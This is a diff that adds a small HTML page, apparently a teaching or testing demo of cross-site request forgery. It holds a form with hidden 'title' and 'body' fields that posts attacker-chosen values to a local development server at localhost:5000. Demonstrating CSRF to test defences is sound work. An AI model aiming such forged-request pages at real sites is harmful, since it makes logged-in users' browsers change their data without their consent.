@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Page Post</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <form action="https://localhost:5000/" method="POST">
+        <input type="hidden" name="title" value="HARMFUL CODE" />
+        <input type="hidden" name="body" value="ATTACKER INPUT" />
+        <input type="submit" value="update" />
+    </form>
+</body>
+</html>
